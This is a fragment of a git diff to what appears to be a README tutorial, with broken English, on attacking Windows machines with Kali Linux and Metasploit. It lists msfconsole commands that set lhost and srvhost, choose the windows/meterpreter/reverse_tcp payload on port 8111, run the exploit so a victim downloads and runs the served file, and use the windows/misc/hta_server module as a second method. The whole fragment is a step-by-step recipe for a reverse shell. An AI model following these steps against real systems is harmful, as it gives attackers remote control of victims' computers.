@@ -114,9 +114,11 @@ Once you receive the message Installation is complete, click Continue to reboot 
 --->>> update your kali linux using the command:
 
 ```$ apt-get update```
+
 ```$ apt-get upgrade```
 
 --->>> log the system to attack tape:
+
 ```$ msfconsole```
 
 ## We have two method 
@@ -131,14 +133,17 @@ Once you receive the message Installation is complete, click Continue to reboot 
 ```$ ifconfig```
 
 ```$ set lhost "your Ip address"```
+
 ```$ set srvhost "your Ip address"```
 
 --->>>set payload following comand
 
 ```$ set payload windows/meterpreter/reverse_tcp```
+
 ```$ set lport 8111```
 
 --->>>tape exploit
+
 ```$ exploit```
 
 --->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 
@@ -152,6 +157,8 @@ Once you receive the message Installation is complete, click Continue to reboot 
 --->>> when you are in the console tape
 
 ```$ use windows/misc/hta_server```
+
+```$ set srvhost "your Ip address"```
 
 ```$ set uripath /name it```
 
